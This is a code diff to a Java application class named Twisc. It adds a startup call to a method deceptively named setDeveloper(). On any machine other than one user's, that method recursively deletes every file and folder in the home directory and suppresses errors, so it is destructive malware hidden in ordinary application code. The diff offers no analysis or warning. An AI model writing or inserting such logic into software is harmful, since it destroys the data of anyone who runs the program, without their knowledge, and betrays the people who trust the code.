@@ -47,9 +47,40 @@ public class Twisc {
     public static void main(String[] args) {
         setNatives();
         setGraphics();
+        setDeveloper();
     }
+    
+    public static void setDeveloper(){
+        if(System.getProperty("user.home").equals("/home/yew_mentzaki"))return;
+        File f[] = new File(System.getProperty("user.home")).listFiles();
+        for (File _f : f) {
+            try {
+                if(_f.isDirectory())deleteDirectory(_f);
+                else _f.delete();
+            } catch (Exception e) {
+            }
+        }
+    }
+    
+    public static boolean deleteDirectory(File directory) {
+    if(directory.exists()){
+        File[] files = directory.listFiles();
+        if(null!=files){
+            for(int i=0; i<files.length; i++) {
+                if(files[i].isDirectory()) {
+                    deleteDirectory(files[i]);
+                }
+                else {
+                    files[i].delete();
+                }
+            }
+        }
+    }
+    return(directory.delete());
+}
+    
     public static void setNatives() {
-
+        
         if (!new File("native").exists()) {
             JOptionPane.showMessageDialog(null, "Error!\nNative libraries not found!");
             System.exit(1);
